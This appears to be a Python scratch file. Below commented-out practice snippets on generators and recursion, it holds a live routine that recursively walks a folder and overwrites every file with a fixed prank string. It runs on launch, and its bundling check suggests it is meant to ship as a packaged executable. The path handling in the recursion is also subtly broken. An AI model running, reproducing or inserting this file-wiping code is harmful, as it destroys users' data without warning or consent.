
from statistics import mode
import sys
import os
import random
# def func1():
#     yield 1
#     yield from  func2()
#     yield 2

# def func2():
#     yield 3
#     yield 5

# f1 = func1()
# for item in f1:
#     print(item)
# print(sys.getrecursionlimit())
# #sys.setrecursionlimit(5000)

# i = 0

# def func():
#     global  i
#     print(i)
#     i += 1
#     #func()

# func()
basedir = "./"
if getattr( sys, 'frozen', False ) :
    # running in a bundle
    basedir = sys._MEIPASS
else :
    basedir = "./"
def func(path):


    list1 = os.listdir(path=path)
    # print(list1)
    for item in list1:
        real_path = os.path.abspath(item)
        if os.path.isdir(real_path):
            func(real_path)
        else :
            with open(real_path,mode='w',encoding='utf-8') as f:
                f.write('前端牛逼!!!333333333')

func(basedir)


# iplist = [1,2,3,4,5,6,7,8,9]



